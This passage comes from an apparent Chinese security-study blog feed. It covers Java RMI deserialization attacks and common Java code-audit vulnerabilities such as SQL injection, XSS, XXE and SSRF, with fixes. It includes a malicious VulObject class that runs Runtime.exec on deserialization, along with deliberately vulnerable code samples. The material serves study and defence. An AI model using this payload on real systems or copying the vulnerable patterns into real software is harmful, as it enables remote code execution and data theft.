class="built_in">println</span>(services.sendMessage(malicious));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20210204205817.png" alt=""></p><p>我们在客户端这里创建一个恶意的命令执行的类VulObject。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulObject</span> <span class="keyword">extends</span> <span class="title">Message</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7398165783113471324L</span>;</span><br><span class="line">    <span class="keyword">private</span> String param;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParam</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.param = param;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">this</span>.param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="本地获取注册中心-反序列化点"><a href="#本地获取注册中心-反序列化点" class="headerlink" title="本地获取注册中心(反序列化点)"></a>本地获取注册中心(反序列化点)</h4><p>获取注册中心的两种方式。</p><ul><li>创建时获取:LocateRegistry#createRegistry</li><li>远程获取:LocateRegistry#getRegistry</li></ul><p>无论是客户端还是服务端，最终其调用注册中心的方法都是通过对创建的RegistryImpl对象进行调用。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210204152056.png" alt=""></p><p>我们这里分析下调用 <code>LocateRegistry</code> 类的 <code>getRegistry</code> 方法。</p><p>调用通过<code>getRegistry</code> 方法得到的<code>RegistryImpl_Stub</code> 的 <code>bind</code> 方法。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210204144136.png" alt=""></p><p>这里首先通过<strong>newCall</strong>方法调用 TCPChannel 类的 createConnection 方法创建 socket 连接和注册服务通信。</p><p>然后通过<strong>writeObject</strong>方法先后写入bind方法序列化的参数值。</p><p>然后通过调用serviceCall 方法，获取到dispatcher，最后调用registry.RegistryImpl_Skel类的dispatch方法。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210204200612.png" alt=""></p><p>var3是传递过来的int类型的参数，在这里有如下关系的对应：</p><ul><li>0-&gt;bind</li><li>1-&gt;list</li><li>2-&gt;lookup</li><li>3-&gt;rebind</li><li>4-&gt;unbind</li></ul><p>​     根据参数来决定服务端与客户端调用的方法。这个过程中基于序列化和反序列化来进行通讯的。那么我们就可以寻找反序列化的点来进行攻击。</p><h4 id="调用rmi执行反序列化攻击"><a href="#调用rmi执行反序列化攻击" class="headerlink" title="调用rmi执行反序列化攻击"></a>调用rmi执行反序列化攻击</h4><p>首先启动注册服务，然后执行服务端，最后执行客户端。可以发现客户端能够成功调用服务端上的方法，实现远程方法调用。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210204210147.png" alt=""></p><h4 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h4><ul><li>服务端Clockmpl()继承Clock()创建对象。</li><li>服务端CLock()注册远程对象</li><li>客户端访问服务器b并查找相应远程对象。</li><li>服务端将stub(存根返回)客户端</li><li>客户端调用stub(存根)的方法</li><li>stub(存根)作为代理与服务端骨架通信//骨架作为服务端代理。</li><li>骨架代理调用Clockmpl相应方法。</li><li>骨架将结果返回给客户端的存根</li><li>存根返回给客户端。</li></ul><h5 id="P牛对注册中心的解释"><a href="#P牛对注册中心的解释" class="headerlink" title="P牛对注册中心的解释"></a>P牛对注册中心的解释</h5><p>​    RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调用。</p><h4 id="插一张先知的流程图"><a href="#插一张先知的流程图" class="headerlink" title="插一张先知的流程图"></a>插一张先知的流程图</h4><p><img src="007S8ZIlly1gfz5kokqvgj30fe0if407.jpg" alt="img"></p><h3 id="RMI攻击手法"><a href="#RMI攻击手法" class="headerlink" title="RMI攻击手法"></a>RMI攻击手法</h3><p>先知社区上的一些总结，上图:</p><p><img src="20200701101308-6810e0aa-bb40-1.png" alt="img"></p><p><strong>大致可以分为以下四类:</strong></p><ul><li><p>探测利用开放的RMI服务。</p></li><li><p>基于RMI服务反序列化过程的攻击。</p></li><li><p>利用RMI的动态加载特性的攻击利用。</p></li><li><p>结合JNDI注入。</p></li></ul><p>我们主要学习RMI结合反序列化攻击的相关内容。</p><h4 id="基于RMI服务反序列化过程的攻击"><a href="#基于RMI服务反序列化过程的攻击" class="headerlink" title="基于RMI服务反序列化过程的攻击"></a>基于RMI服务反序列化过程的攻击</h4><p>RMI反序列化漏洞的存在必须包含两个条件：</p><ol><li>能够进行RMI通信</li><li>目标服务器引用了第三方存在反序列化漏洞的jar包</li></ol><p>注：复现的时候需要JDK8 121以下版本，121及以后加了白名单限制。</p><h4 id="利用RMI的动态加载特性的攻击利用"><a href="#利用RMI的动态加载特性的攻击利用" class="headerlink" title="利用RMI的动态加载特性的攻击利用"></a>利用RMI的动态加载特性的攻击利用</h4><h5 id="codebase"><a href="#codebase" class="headerlink" title="codebase"></a>codebase</h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;applet code=<span class="string">"HelloWorld.class"</span> codebase=<span class="string">"Applets"</span> <span class="built_in">width</span>=<span class="string">"800"</span> <span class="built_in">height</span>=<span class="string">"600"</span>&gt;</span><br><span class="line">&lt;/applet&gt;</span><br></pre></td></tr></table></figure><p>​     codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类；CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。所以动态加载的class文件可以保存在web服务器、ftp中。</p><p>​     如果我们指定 codebase=<a href="http://example.com/" target="_blank" rel="noopener">http://example.com/</a> ，动态加载 org.vulhub.example.Example 类，<br>则Java虚拟机会下载这个文件<a href="http://example.com/org/vulhub/example/Example.class，并作为" target="_blank" rel="noopener">http://example.com/org/vulhub/example/Example.class，并作为</a> Example类的字节码。</p><p>​     在RMI中，我们可以通过codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去 CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p><p><strong>但是相对而言这种限制条件很严：</strong></p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</li></ul><p>这里使用这位师傅打包好的代码学习:<a href="https://github.com/fa1c0n1/rmi-attack-demo" target="_blank" rel="noopener">https://github.com/fa1c0n1/rmi-attack-demo</a></p><h5 id="客户端动态加载"><a href="#客户端动态加载" class="headerlink" title="客户端动态加载"></a>客户端动态加载</h5><ul><li>创建HTTP服务器，作为动态加载代码的远程仓库。</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">8000</span></span><br></pre></td></tr></table></figure><ul><li>服务端创建远程对象，<code>RMI Registry</code>启动并完成名称绑定，并设置<code>java.rmi.server.codebase</code>。</li></ul><p><img src="QQ%E6%88%AA%E5%9B%BE20210204220949.png" alt=""></p><ul><li>客户端对<code>RMI Registry</code>发起请求，根据提供的<code>Name</code>得到<code>Stub</code>，并根据服务器返回的<code>java.rmi.server.codebase</code>远程加载动态所需的类。</li></ul><p><img src="QQ%E6%88%AA%E5%9B%BE20210204221009.png" alt=""></p><h5 id="服务端动态加载"><a href="#服务端动态加载" class="headerlink" title="服务端动态加载"></a>服务端动态加载</h5><p>恶意的客户端代码：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210209010010.png" alt=""></p><p>受害服务端代码：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210204221040.png" alt=""></p><h4 id="结合JNDI注入"><a href="#结合JNDI注入" class="headerlink" title="结合JNDI注入"></a>结合JNDI注入</h4><p>放到后面再细说。。(学晕了)</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://payloads.info/2020/06/21/Java%E5%AE%89%E5%85%A8-RMI-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://payloads.info/2020/06/21/Java%E5%AE%89%E5%85%A8-RMI-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90</a></p><p><a href="https://xz.aliyun.com/t/8644" target="_blank" rel="noopener">https://xz.aliyun.com/t/8644</a></p><p><a href="https://xz.aliyun.com/t/8706" target="_blank" rel="noopener">https://xz.aliyun.com/t/8706</a></p><p><a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a></p><p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-RMI-README.md#6mltu7" target="_blank" rel="noopener">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-RMI-README.md#6mltu7</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;java安全学习–RMI学习&quot;&gt;&lt;a href=&quot;#java安全学习–RMI学习&quot; class=&quot;headerlink&quot; title=&quot;java安全学习–RMI学习&quot;&gt;&lt;/a&gt;java安全学习–RMI学习&lt;/h2&gt;&lt;h3 id=&quot;RMI定义&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="java代码审计学习" scheme="https://shu1l.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="RMI" scheme="https://shu1l.github.io/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计之常见漏洞学习</title>
    <link href="https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/"/>
    <id>https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/</id>
    <published>2021-01-27T06:28:28.788Z</published>
    <updated>2021-01-27T06:48:34.750Z</updated>
    
    <content type="html"><![CDATA[<p>title: java代码审计之常见漏洞学习<br>abbrlink: 15301<br>date: 2021-01-27 14:28:28<br>tags:</p><h2 id="java代码审计之常见漏洞学习"><a href="#java代码审计之常见漏洞学习" class="headerlink" title="java代码审计之常见漏洞学习"></a>java代码审计之常见漏洞学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Java代码审计中常见的一些漏洞学习总结以及一些审计思路。</p><h4 id="java项目分层"><a href="#java项目分层" class="headerlink" title="java项目分层"></a>java项目分层</h4><ul><li>视图层(View 视图)</li><li>控制层（Controller、Action控制层)</li><li>服务层(Service)</li><li>业务逻辑层BO(business object)</li><li>实体层(entity 实体对象、VO(value)object)值对象、模型层(bean)</li></ul><h5 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h5><ul><li>Servlet是在Java Web容器上运行的小程序</li><li>Servlet3.0之前的版本都需要在web.xml中配置</li><li>Spring MVC框架就是基于Servlet技术实现的</li></ul><h4 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h4><h5 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h5><p>本质是将用户的输入当做代码执行，程序将用户的输入拼接到了sql语句中，改变原来sql语句的语义造成攻击。</p><p><strong>常见的一些例子</strong></p><p>DAO: 存在拼接的SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String sql="<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">"+id</span></span><br></pre></td></tr></table></figure><p>Hibernate框架</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.createQuery(<span class="string">"from Book where title like '%"</span> + userInput + <span class="string">"%' and pu</span></span><br><span class="line">blished = true<span class="string">")</span></span><br></pre></td></tr></table></figure><p>Mybatis框架</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="keyword">like</span> ‘%$&#123;title&#125;%’</span><br><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span> ($&#123;<span class="keyword">id</span>&#125;)，</span><br><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> title =‘<span class="keyword">java</span>’ <span class="keyword">order</span> <span class="keyword">by</span> $&#123;<span class="built_in">time</span>&#125; <span class="keyword">asc</span></span><br></pre></td></tr></table></figure><h5 id="审计方法"><a href="#审计方法" class="headerlink" title="审计方法"></a>审计方法</h5><p>​    对于sql注入来讲，只要是与数据库存在交互的地方，应用程序对用户的输入没有进行有效的过滤，都有可能存在SQL注入漏洞。</p><p>在实际环境中<strong>，中间件漏洞的sql注入漏洞可能更多：</strong></p><ul><li>Mybatis框架中的like、in和order by语句。</li><li>Hibernate框架中的createQuery()函数</li></ul><p>快速定位相关sql语句上下文，查看是否有显式过滤机制。</p><h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><ul><li><p>参数化查询，使用java.sql.PreparedStatement来对数据库发起参数化查询。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stmt=conncetion.prepare<span class="constructor">Statement(<span class="params">sqlString</span>)</span>;</span><br><span class="line">stmt.set<span class="constructor">String(1,<span class="params">userName</span>)</span>;</span><br><span class="line">stmt.set<span class="constructor">String(2,<span class="params">itemName</span>)</span>;</span><br><span class="line">rs=stmt.execute<span class="constructor">Query()</span>;</span><br></pre></td></tr></table></figure></li><li><p>使用预编译能够预防绝大多数SQL注入，<strong>java.sql.PreparedStatement代替java.sql.Statement</strong>,但对于order by后的不能用预编译进行处理，只能手动过滤。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">String sqlString = "select * from db<span class="emphasis">_user where username=? and password=?";</span></span><br><span class="line"><span class="emphasis">        PreparedStatement stmt = connection.prepareStatement(sqlString);</span></span><br><span class="line"><span class="emphasis">        stmt.setString(1, username);</span></span><br><span class="line"><span class="emphasis">        stmt.setString(2, pwd);</span></span><br><span class="line"><span class="emphasis">        ResultSet rs = stmt.executeQuery();</span></span><br><span class="line"><span class="emphasis">......</span></span><br></pre></td></tr></table></figure></li><li><p>Mybatis的SQL配置中，采用<code>#</code>变量名称</p></li></ul><h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><h5 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h5><p>网站与后端交互的输入输出没有做好过滤，导致攻击者可以插入恶意js语句进行攻击。根据后端代码不同 ，大致可以分为反射型、存储型、DOM型</p><p>举例:</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/xss"</span>)</span><br><span class="line"><span class="keyword">public</span> ModelAndView xss(HttpServletRequest request,HttpServletResponse</span><br><span class="line">response) <span class="keyword">throws</span> ServletException,IOException&#123;</span><br><span class="line"> String name = request.getParameter(<span class="string">"name"</span>);</span><br><span class="line"> ModelAndView mav = <span class="keyword">new</span> ModelAndView(<span class="string">"mmc"</span>);</span><br><span class="line"> mav.getModel().put(<span class="string">"uname"</span>, name);</span><br><span class="line"> <span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里接收了用户输入的参数name，然后又直接输出到了页面，整个过程没有任何过滤，</p><p><strong>存储型</strong></p><p>根据已知的用户ID查询该用户的数据并显示在JSP页面上。如果存入的数据存在未经过滤的恶意js代码。就会造成xss攻击。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%  <span class="built_in">..</span>.</span><br><span class="line">    Statement stmt = conn.createStatement();</span><br><span class="line">    ResultSet rs = stmt.executeQuery(<span class="string">"select * from users where id ="</span> + id);</span><br><span class="line">    String<span class="built_in"> address </span>= <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (rs != <span class="literal">null</span>) &#123;</span><br><span class="line">        rs.next();</span><br><span class="line">       <span class="built_in"> address </span>= rs.getString(<span class="string">"address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="审计方法-1"><a href="#审计方法-1" class="headerlink" title="审计方法"></a>审计方法</h5><p>全局搜索用户的输入与输出，查找是否存在过滤。</p><h5 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h5><ul><li>配置全局过滤器web.xml</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">filter</span>&gt;  </span><br><span class="line">        &lt;<span class="keyword">filter</span>-<span class="type">name</span>&gt;XssSafe&lt;/<span class="keyword">filter</span>-<span class="type">name</span>&gt;  </span><br><span class="line">        &lt;<span class="keyword">filter</span>-<span class="keyword">class</span>&gt;XssFilter&lt;/<span class="keyword">filter</span>-<span class="keyword">class</span>&gt;  </span><br><span class="line">    &lt;/<span class="keyword">filter</span>&gt;  </span><br><span class="line">    &lt;<span class="keyword">filter</span>-<span class="keyword">mapping</span>&gt;  </span><br><span class="line">        &lt;<span class="keyword">filter</span>-<span class="type">name</span>&gt;XssSafe&lt;/<span class="keyword">filter</span>-<span class="type">name</span>&gt;  </span><br><span class="line">        &lt;url-pattern&gt;<span class="comment">/*&lt;/url-pattern&gt;  </span></span><br><span class="line"><span class="comment">    &lt;/filter-mapping&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>使用commons.lang包，主要提供了字符串查找、替换、分割、去空白、去掉非法字符等等操作。有几个函数可以用来过滤。</p><ul><li>StringEscapeUtils.escapeHtml(string)，使用HTML实体，转义字符串中的字符。</li><li>StringEscapeUtils.escapeJavaScript(string)，使用JavaScript字符串规则转义字符串中的字符。</li></ul></li></ul><h4 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h4><h5 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h5><p>XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><h5 id="审计方法-2"><a href="#审计方法-2" class="headerlink" title="审计方法"></a>审计方法</h5><p>XML解析一般在导入配置、数据传输接口等场景会用到，xml解析器是否禁用外部实体。</p><p>全局搜索如下函数:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.DocumentBuilder</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.stream</span><span class="selector-class">.XMLStreamReader</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom2</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.SAXParser</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.dom4j</span><span class="selector-class">.io</span><span class="selector-class">.SAXReader</span> </span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.XMLReader</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXSource</span> </span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.TransformerFactory</span> </span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXTransformerFactory</span> </span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.validation</span><span class="selector-class">.SchemaFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.bind</span><span class="selector-class">.Unmarshaller</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.xpath</span><span class="selector-class">.XPathEx</span></span><br></pre></td></tr></table></figure><h5 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h5><ul><li>使用白名单检验，例如上面的代码增加正则匹配</li></ul><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (!Pattern.matches(<span class="string">"[_a-bA-B0-9]+"</span>, user.getUserId()))</span><br><span class="line">if (!Pattern.matches(<span class="string">"[_a-bA-B0-9]+"</span>, user.getDescription()))</span><br></pre></td></tr></table></figure><ul><li>使用安全的XML库，使用dom4j来构建XML,dom4j会对文本数据域进行xml编码。</li></ul><h4 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h4><h5 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h5><p>代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。</p><p>java的SSRF利用方式比较局限:</p><ul><li>利用file协议任意文件读取。</li><li>利用http协议端口探测</li></ul><p><strong>支持的一些协议:</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">file</span> <span class="keyword">ftp</span> mailto <span class="keyword">http</span> <span class="keyword">https</span> jar netdoc</span><br></pre></td></tr></table></figure><p>举例:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String url = request.get<span class="constructor">Parameter(<span class="string">"url"</span>)</span>;</span><br><span class="line">         String htmlContent;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             URL u = <span class="keyword">new</span> <span class="constructor">URL(<span class="params">url</span>)</span>;</span><br><span class="line">             <span class="comment">//URL对象用openconnection()获得openConnection类对象。</span></span><br><span class="line">             URLConnection urlConnection = u.<span class="keyword">open</span><span class="constructor">Connection()</span>;</span><br><span class="line">             HttpURLConnection httpUrl = (HttpURLConnection) urlConnection;</span><br><span class="line">             BufferedReader base = <span class="keyword">new</span> <span class="constructor">BufferedReader(<span class="params">new</span> InputStreamReader(<span class="params">httpUrl</span>.<span class="params">getInputStream</span>()</span>, <span class="string">"UTF-8"</span>));</span><br><span class="line">             <span class="comment">//用inputStream获取字节流然后使用InputStreamReader转化为字符流。</span></span><br><span class="line">             StringBuffer html = <span class="keyword">new</span> <span class="constructor">StringBuffer()</span>;</span><br><span class="line">             <span class="keyword">while</span> ((htmlContent = base.read<span class="constructor">Line()</span>) != null) &#123;</span><br><span class="line">                 html.append(htmlContent);</span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure><p>漏洞代码四种情况</p><ul><li>Request</li></ul><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Request</span>.<span class="keyword">Get</span>(url).<span class="keyword">execute</span>()</span><br></pre></td></tr></table></figure><ul><li>openStream</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL u;</span><br><span class="line"><span class="built_in">int</span> length;</span><br><span class="line">byte<span class="literal">[]</span> <span class="built_in">bytes</span> = <span class="keyword">new</span> byte<span class="literal">[<span class="number">1024</span>]</span>;</span><br><span class="line">u = <span class="keyword">new</span> <span class="constructor">URL(<span class="params">url</span>)</span>;</span><br><span class="line">inputStream = u.<span class="keyword">open</span><span class="constructor">Stream()</span>;</span><br></pre></td></tr></table></figure><ul><li>HttpClient</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">"http://127.0.0.1"</span>;</span><br><span class="line">CloseableHttpClient client = <span class="module-access"><span class="module"><span class="identifier">HttpClients</span>.</span></span>create<span class="constructor">Default()</span>;</span><br><span class="line">HttpGet httpGet = <span class="keyword">new</span> <span class="constructor">HttpGet(<span class="params">url</span>)</span>;</span><br><span class="line">HttpResponse httpResponse;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 该行代码发起网络请求</span></span><br><span class="line">    httpResponse = client.execute(httpGet);</span><br></pre></td></tr></table></figure><ul><li>URLConnection和HttpURLConnection</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URLConnection urlConnection = url.<span class="keyword">open</span><span class="constructor">Connection()</span>;</span><br><span class="line">HttpURLConnection urlConnection = url.<span class="keyword">open</span><span class="constructor">Connection()</span>;</span><br></pre></td></tr></table></figure><h5 id="审计方法-3"><a href="#审计方法-3" class="headerlink" title="审计方法"></a>审计方法</h5><p>只要是能够对外发起网络请求的地方，就有可能会出现SSRF漏洞。重点查找以下函数。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpClient</span>.</span></span>execute</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpClient</span>.</span></span>executeMethod</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpURLConnection</span>.</span></span>connect</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpURLConnection</span>.</span></span>getInputStream</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">URL</span>.</span></span>openStream</span><br></pre></td></tr></table></figure><ul><li><code>new URL()</code>：构造一个url对象</li><li><code>openConnection()</code>:创建一个实例URLConncetion.</li><li><code>getInputStream()</code>：获取URL的字节流</li></ul><h5 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h5><ol><li>取URL的Host</li><li>取Host的IP</li><li>判断是否是内网IP，是内网IP直接return，不再往下执行</li><li>请求URL</li><li>如果有跳转，取出跳转URL，执行第1步</li><li>当判断完成最后会去请求URL </li></ol><h4 id="任意文件操作类漏洞"><a 